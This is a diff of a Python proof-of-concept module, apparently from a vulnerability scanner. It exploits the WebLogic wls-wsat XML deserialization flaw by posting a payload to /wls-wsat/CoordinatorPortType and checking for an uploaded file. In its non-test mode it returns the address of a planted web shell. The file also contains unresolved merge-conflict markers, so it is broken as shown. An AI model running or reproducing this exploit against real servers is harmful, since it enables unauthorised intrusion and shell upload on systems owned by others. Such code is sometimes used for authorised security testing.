@@ -3,6 +3,10 @@
 
 
 from ServiceScanModel.models import ServiceScan
+<<<<<<< HEAD
+=======
+from VulnScanModel.models import VulnScan
+>>>>>>> master
 from ..requestClass import Requests
 
 xml_payload = '''
@@ -27,11 +31,16 @@ xml_payload = '''
 
 
 class POC:
+<<<<<<< HEAD
     def __init__(self, service: ServiceScan):
+=======
+    def __init__(self, service):
+>>>>>>> master
         self.service = service
         self.requestUtil = Requests(service.cookies)
         self.result = False
 
+<<<<<<< HEAD
     def xml_deserialize(self, url, file, content, type="poc"):
         payload = xml_payload.format(file=file, content=content)
         self.requestUtil.post(url + "/wls-wsat/CoordinatorPortType", header={"Content-Type": "text/xml"},
@@ -42,6 +51,18 @@ class POC:
                 return ["weblogic_XML反序列化", 'Path: /bea_wls_internal/passerW.txt<br>Content: passer-W']
         else:
             return "上传成功，shell地址：\n%s"%(url+"/bea_wls_internal/%s"%file)
+=======
+    def xml_deserialize(self, file, content, type="poc"):
+        payload = xml_payload.format(file=file, content=content)
+        self.requestUtil.post(self.service.url + "/wls-wsat/CoordinatorPortType", header={"Content-Type": "text/xml"},
+                         data=payload)
+        if type == "poc":
+            resp = self.requestUtil.get(self.service.url + "/bea_wls_internal/%s"%file)
+            if content in resp.text:
+                return ["weblogic_XML反序列化", 'Path: /bea_wls_internal/passerW.txt<br>Content: passer-W']
+        else:
+            return "上传成功，shell地址：\n%s"%(self.service.url+"/bea_wls_internal/%s"%file)
+>>>>>>> master
 
 
     def fingerprint(self):
